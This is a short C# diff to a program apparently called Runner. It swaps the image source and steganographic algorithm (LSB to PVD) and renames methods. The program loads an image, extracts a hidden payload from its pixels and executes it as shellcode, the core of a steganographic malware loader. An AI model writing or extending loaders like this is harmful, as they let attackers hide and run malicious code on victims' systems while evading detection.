@@ -13,8 +13,8 @@ namespace Runner
         static Bitmap bm;
 
 
-        static IImageSource img  = new HTTPX();
-        static IAlgorithm   alg  = new LSB();
+        static IImageSource img  = new ImageFile();
+        static IAlgorithm   alg  = new PVD();
         static IPayload     pld  = new Shellcode();
 
         static void Main(string[] args)
@@ -24,9 +24,9 @@ namespace Runner
                 int payload_size = int.Parse(args[1]);
                 payload_data = new byte[payload_size];
 
-                bm = img.load(args[0]);
-                alg.read(bm, payload_data);
-                pld.run(payload_data);
+                bm = img.Load(args[0]);
+                alg.Read(bm, payload_data);
+                pld.Run(payload_data);
             }
         }
     }
